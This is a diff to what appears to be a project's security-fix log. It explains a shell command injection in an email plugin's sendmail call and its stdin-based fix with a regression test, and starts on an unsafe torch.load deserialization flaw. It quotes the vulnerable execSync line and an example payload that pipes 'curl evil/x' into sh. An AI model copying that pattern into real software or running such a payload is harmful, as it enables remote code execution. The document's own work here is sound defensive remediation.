@@ -1508,6 +1508,21 @@ No real Electron runtime is installed in this environment (`desktop-app/` has no
 
 Proved the test isn't vacuous: reverted the `read-file` fix alone, confirmed exactly that one check failed (8/9), restored, confirmed a clean 9/9.
 
+### Command injection in `plugins/email.ts`'s `EmailPlugin.trySendmail()`
+
+Found by a background audit agent, independently verified against real source before acting. `trySendmail()` built its shell invocation as:
+
+```ts
+execSync(`echo "${mime.replace(/"/g, '\\"')}" | ${sendmailPath} -t -i`, { timeout: 10000 });
+```
+
+`mime` is built from `email.from`/`email.to`/`email.subject`/`email.body` — the arguments to `send()`. The `.replace(/"/g, '\\"')` only escapes literal `"` characters, preventing an attacker from breaking *out* of the double-quoted string. It does nothing about backticks or `$(...)`: both are still interpreted by the shell as command substitution *inside* double-quoted strings in POSIX shell (only single quotes fully neutralize shell metacharacters). A `subject` or `body` containing `` `curl evil/x | sh` `` would execute as a real shell command the moment `execSync` ran this string — a genuine command injection, not a theoretical one, reachable the instant any caller wires user- or model-influenced content into `send()`.
+
+`EmailPlugin` is genuinely instantiated and activated by `NeuroclawSystem.initialize()`, but `send()` currently has no live caller — `PluginRegistry.dispatch()`'s intent map never routes to `email`, and `EmailPlugin` never overrides `onMessage()`. Fixed anyway, on the same principle as every other security fix this session: a landmine with no live caller today is still a real bug, and the fix cost is the same regardless of current reachability, while leaving it in place means the moment someone *does* wire user input to `send()` (the obvious, likely next step for an "Email" plugin), it becomes exploitable with zero additional review.
+
+Fixed by extracting `buildSendmailInvocation(mime, sendmailPath)`, which puts the MIME content into `execSync`'s `input` option (written to the child process's stdin) instead of interpolating it into the shell command string at all. `sendmailPath` alone remains safe to put in the command string — it only ever comes from `which()` resolving one of a fixed set of literal binary names (`sendmail`/`ssmtp`/`msmtp`), never user input.
+
+New `testEmailPluginCommandInjection` (`test/smoke.mjs`): builds a MIME payload containing both a backtick command substitution and a `$()` one, calls the extracted `buildSendmailInvocation()` directly, and asserts the returned shell `command` string is exactly `${sendmailPath} -t -i` — containing neither the payload nor any substring of it — while the `input` field carries the full MIME content (payload included) verbatim. Proved it catches the regression: reintroduced the vulnerable `echo "..." | sendmail` construction directly inside `buildSendmailInvocation()` (not just at the `trySendmail()` call site, so the test would actually be exercising the same code path it tests), confirmed all three checks fail exactly as expected; restored and confirmed a clean pass. `node test/smoke.mjs`: 670/670 (up from 667 — 3 new checks).
 ### `load_extension()` (the "install a community-shared extension" path) executed arbitrary code from any file it loaded
 
 Found by a background audit agent, independently verified against real source before acting. `tinygpt/extension_builder.py`'s `load_extension()` called `torch.load(path, map_location="cpu", weights_only=False)`. `install_extension()` — the same file, one function below — documents its own purpose explicitly: "Install a **community-shared** (or previously-saved) extension." `weights_only=False` lets `torch.load`'s pickle deserializer execute arbitrary Python code embedded in the file via `__reduce__`/`__setstate__` — a well-known PyTorch footgun, which is exactly why `weights_only=True` exists as the safer alternative. Loading a file explicitly documented as something someone *else* built, with the unsafe deserialization mode, is a real remote-code-execution vector: a malicious `.ext` file shared as a "community extension" would execute arbitrary code the moment anyone installed it.
